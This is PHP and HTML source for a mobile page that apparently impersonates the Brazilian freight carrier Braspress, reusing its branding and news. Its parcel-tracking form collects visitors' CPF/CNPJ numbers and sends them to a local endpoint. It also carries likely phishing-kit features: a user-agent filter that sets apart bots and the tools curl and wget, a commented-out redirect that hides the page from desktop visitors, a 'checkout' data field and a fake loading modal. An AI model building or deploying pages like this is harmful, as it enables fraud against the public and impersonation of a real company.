<?php
$visitantes_data = "dados/visitantes.json";

function contar_visitantes($visitantes_data) {
    $ip = $_SERVER["REMOTE_ADDR"];
    $is_bot = false;

    $bot_agents = ["bot", "spider", "crawler", "curl", "wget"];

    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        foreach ($bot_agents as $bot) {
            if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
                $is_bot = true;
                break;
            }
        }
    }

    $arquivo = file_exists('/tmp/visitantes.json') ? '/tmp/visitantes.json' : __DIR__ . '/' . $visitantes_data;
    $conteudo = @file_get_contents($arquivo);
    $dados = json_decode($conteudo, true);

    if ($dados === null) {
        $dados = [
            "visitantes" => 0,
            "bots" => 0,
            "rastreios" => [],
            "checkout" => []
        ];
    }

    if ($is_bot) {
        if (!isset($_SESSION["registrou_bot"])) {
            $dados["bots"] += 1;
            $_SESSION["registrou_bot"] = true;
        }
    } else {
        if (!isset($_SESSION["registrou_visitante"])) {
            $dados["visitantes"] += 1;
            $_SESSION["registrou_visitante"] = true;
        }
    }

    @file_put_contents('/tmp/visitantes.json', json_encode($dados));

    return $dados["visitantes"];
}

session_start();
$totalDeVisitantes = contar_visitantes($visitantes_data);
?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <!-- <script src="https://unpkg.com/mobile-detect/mobile-detect.min.js"></script>
    <script>
      var md = new MobileDetect(window.navigator.userAgent);
    
      if (!md.mobile()) {
        window.location.href = "about:black";
      }
    </script> -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="includes/fonte.css">
    <link rel="stylesheet" href="https://use.hugeicons.com/font/icons.css" />
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <title>Braspress Transportes Urgentes</title>
</head>
<body class="bg-gray-100">
    <header class="bg-sky-800 p-2 flex justify-between items-center">
        <div class="">
            <img src="assets/imagens/logo.png" alt="Logotipo da Braspress" class="h-15">
        </div>
        <div class="flex m-2">
            <img class="h-5 m-1" src="assets/icones/menu.svg" alt="Menu">
            <img class="h-5 m-1" src="assets/icones/usuario.png" alt="Usuário">
        </div>
    </header>

    <div class="bg-[url('assets/imagens/bannerv3.jpg')] bg-cover bg-center h-60 flex items-center justify-center flex i mb-10 bg-black/40">
        <div class="mt-25 bg-white w-80 p-4 rounded-lg flex flex-col items-center shadow-lg h-50">
            <h1 class="text-center font-bold text-lg mb-2 text-sky-800 flex items-center m-1"><i class="hgi hgi-stroke hgi-search-01 m-1"></i> Rastreie sua Encomenda</h1>
            <form id="formRastreio" method="POST" action="consulta/api.php">
                <input type="text" class="w-70 p-3 bg-gray-100 rounded mt-2 text-sm" name="cpf" placeholder="Digite seu CPF/CNPJ" id="codigoRastreio">
                <button type="submit" class="bg-orange-400 w-70 text-white p-2 rounded mt-2 cursor-pointer flex items-center justify-center" id="btnRastrear"><i class="hgi hgi-stroke hgi-package-search m-1"></i> Acompanhar Encomenda</button>
            </form>
            <a href="#" class="text-sm text-blue-600 mt-2">Tenho duvidas sobre minha encomenda.</a>
        </div>
    </div>

    <div class="p-8">
        <h1 class="text-center mb-4 text-[25px] text-sky-800 font-bold">Nossos Serviços</h1>
        <div class="bg-[url('assets/imagens/rodoviario.jpg')] bg-cover bg-center h-40 rounded-lg mb-5">
            <div class="flex items-center justify-center h-full bg-black/60 rounded-lg">
                <h1 class="text-white">Transporte Rodoviário</h1>
            </div>
        </div>

        <div class="bg-[url('assets/imagens/aereo.jpg')] bg-cover bg-center h-40 rounded-lg mb-5">
            <div class="flex items-center justify-center h-full bg-black/60 rounded-lg">
                <h1 class="text-white">Transporte Aéreo</h1>
            </div>
        </div>

        <div class="bg-[url('assets/imagens/loja.jpg')] bg-cover bg-center h-40 rounded-lg mb-5">
            <div class="flex items-center justify-center h-full bg-black/60 rounded-lg">
                <h1 class="text-white">Transporte para o e-commerce</h1>
            </div>
        </div>

        <div class="bg-[url('assets/imagens/fluxo.jpg')] bg-cover bg-center h-40 rounded-lg mb-1">
            <div class="flex items-center justify-center h-full bg-black/60 rounded-lg">
                <h1 class="text-white">Transporte rodofluvial</h1>
            </div>
        </div>
    </div>

    <div class="p-8">
        <h1 class="text-[25px] text-sky-800 font-bold text-center mb-2">Noticias</h1>
        <div class="shadow-lg rounded-lg mb-4 bg-white overflow-hidden">
            <img src="assets/imagens/noticia1.jpeg" alt="Noticia 1" class="w-full h-auto mb-2">
            <h2 class="text-md text-blue-600 font-black leading-4 text-left p-4">Braspress Air Cargo recebe o certificado de Operador Aéreo da Agência Nacional de Aviação Civil</h2>
            <p class="text-xs p-4 text-justify">A Braspress Air Cargo recebeu o Certificado de Operador Aéreo (COA) da ANAC (Agência Nacional de Aviação Civil), portanto, a nova companhia aérea está homologada para iniciar as operações.
            A autorização foi publicada no Diário Oficial da União, no dia 24 de abril passado, quando o anúncio foi divulgado pela Companhia no encerramento da Intermodal South América 2025, maior evento dos setores de logística, transporte de cargas e comércio exterior da América Latina.</p>
        </div>
        <div class="shadow-lg rounded-lg mb-4 bg-white overflow-hidden">
            <img src="assets/imagens/noticia2.jpg" alt="Noticia 1" class="w-full h-auto mb-2">
            <h2 class="text-md text-blue-600 font-black leading-4 text-left mb-2 p-4">Braspress é tricampeã no prêmio Top of Mind do Transporte</h2>
            <p class="text-xs p-4 text-justify">A Braspress, tradicional empresa de transporte de encomendas nacional, foi consagrada pelo terceiro ano consecutivo com o prêmio Top Transpo – Sustentável, na manhã da última quarta-feira (23), oferecido pela revista Transpodata na premiação Top of Mind.
            O evento ocorreu na Zona Norte de São Paulo (SP), no Distrito Anhembi, e Urubatan Helou, Diretor-Presidente da Companhia compareceu à ocasião e agradeceu pelo reconhecimento dado à Organização.</p>
        </div>
        <div class="shadow-lg rounded-lg mb-4 bg-white overflow-hidden">
            <img src="assets/imagens/noticia3.jpg" alt="Noticia 1" class="w-full h-auto mb-2">
            <h2 class="text-md text-blue-600 font-black leading-4 text-left mb-2 p-4">Braspress participa pela primeira vez da Intermodal</h2>
            <p class="text-xs p-4 text-justify">A Braspress, tradicional empresa de transporte de encomendas, participa pela primeira vez da feira Intermodal South America, mostrando a abrangência das suas operações multimodais, incluindo a nova companhia de carga aérea do grupo, a BRASPRESS AIR CARGO (BAC).
            A maior feira de logística e transporte de cargas da América Latina ocorrerá no Distrito Anhembi, na Zona Norte de São Paulo (SP), entre os dias 22 e 24 de abril. A Organização estará presente na rua H, em um estande de 96 metros quadrados com uma decoração já claramente alusiva à robusta multimodalidade que somente a Braspress tem.</p>
        </div>
        <div class="shadow-lg rounded-lg mb-2 bg-white overflow-hidden">
            <img src="assets/imagens/noticia4.jpg" alt="Noticia 1" class="w-full h-auto mb-2">
            <h2 class="text-md text-blue-600 font-black leading-4 text-left mb-2 p-4">Braspress homenageia o melhor Motorista de 2024</h2>
            <p class="text-xs text-justify p-4">Com a divulgação do resultado do Ranking Anual dos Motoristas Braspress, Urubatan Helou, Diretor-Presidente, convidou Luis Marcelo Pagliuso para receber a placa de homenagem a conquista do primeiro lugar na premiação na tarde da última quarta-feira (19).
            Luis Marcelo Pagliuso foi o melhor ranqueado pelas métricas de Telemetria da Organização e pelo segundo ano consecutivo, alcançou este marco.</p>
        </div>
    </div>

    <div class="fixed bg-black/60 h-screen w-full top-0 left-0 z-10 flex items-center justify-center hidden" id="modal">
        <div class="bg-white w-80 rounded-lg p-1">
            <h1 class="text-center text-lg text-sky-800 mt-5">Carregando Aguarde...</h1>
            <img src="assets/imagens/carregando.gif" alt="Carregando" class="w-auto h-50 mx-auto mb-4">
        </div>
    </div>

    <div class="p-8">
        <h1 class="text-[25px] text-sky-800 font-bold text-center mb-2">Conheça a BRASPRESS</h1>
        <iframe 
            class="rounded-lg mb-2"
            src="https://www.youtube.com/embed/W29E-AfKINQ"
            width="100%"
            height="300"
            frameborder="0"
            allowfullscreen>
        </iframe>
    </div>

    <footer class="bg-sky-800 p-6 text-center text-white text-left">
        <h1 class="font-bold text-sm mb-1">Acesso Rápido</h1>
        <p class="text-xs mb-1 text-blue-400">Cotacação Online</p>
        <p class="text-xs mb-1 text-blue-400">Pedido de Coleta</p>
        <p class="text-xs mb-1 text-blue-400">Pagamento de fatura</p>
        <p class="text-xs mb-4 text-blue-400">Prazo de entrega</p>

        <h1 class="font-bold text-sm mb-1">Área do Cliente</h1>
        <p class="text-xs mb-1 text-blue-400">Minha Conta</p>
        <p class="text-xs mb-1 text-blue-400">Solicite seu Acesso</p>
        <p class="text-xs mb-4 text-blue-400">Informações Úteisa</p>

        <h1 class="font-bold text-sm mb-1">A Braspress</h1>
        <p class="text-xs mb-1 text-blue-400">Quem Somos</p>
        <p class="text-xs mb-1 text-blue-400">História</p>
        <p class="text-xs mb-1 text-blue-400">Demonstrativos Financeiros</p>
        <p class="text-xs mb-4 text-blue-400">Certificados</p>

        <h1 class="font-bold text-sm mb-1">Diferenciais</h1>
        <p class="text-xs mb-1 text-blue-400">Abrangência nacional</p>
        <p class="text-xs mb-1 text-blue-400">Infraestrutura</p>
        <p class="text-xs mb-1 text-blue-400">Tecnologia</p>
        <p class="text-xs mb-6 text-blue-400">Automação</p>

        <div class="mb-2 flex">
            <img src="assets/imagens/link.png" alt="Link" class="h-7 m-1">
            <img src="assets/imagens/youtube.png" alt="Link" class="h-7 m-1">
            <img src="assets/imagens/facebook.png" alt="Link" class="h-7 m-1">
            <img src="assets/imagens/instagram.png" alt="Link" class="h-7 m-1">
        </div>

        <hr class="border-t border-sky-700 mb-4">
        
        <div class="flex flex-col items-center mb-4">
        <img src="assets/imagens/logo.png" alt="Logo da Braspress" class="h-12 mb-2">
        <p class="text-center text-xs font-lght">© 2025 Braspress - Direitos reservados.</p>
        </div>

    </footer>

    <script src="js/modal.js"></script>

    
</body>
</html>